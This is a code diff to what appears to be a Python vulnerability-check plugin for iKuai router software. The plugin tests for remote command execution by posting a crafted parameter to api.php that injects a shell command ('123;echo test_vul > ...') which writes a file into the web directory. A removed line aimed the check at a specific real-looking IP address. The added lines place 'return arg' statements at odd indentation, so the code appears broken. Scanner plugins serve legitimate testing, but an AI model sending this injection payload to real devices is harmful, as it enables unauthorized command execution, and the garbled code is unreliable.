@@ -20,7 +20,8 @@ def audit(arg):
             if code==200 and 'test_vul' in res:
                 security_hole('Commend Exec'+upload_url)
                 upload_url=arg+'Tools/ping_test/start'
-        
+                return arg
+
         upload2_url=arg+'api.php'
         upload2_post="type=home&get_lans_top10_param[type]=123;echo test_vul+>+/tmp/ikuai/www/resources/js/vultwo.js"
         code, head, res, errcode, _ = curl.curl2(upload2_url,post=upload2_post)
@@ -32,6 +33,7 @@ def audit(arg):
 
 
 
-if __name__ == '__main__':
+
+                return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('ikuai', 'http://221.10.198.235:81/')[1])
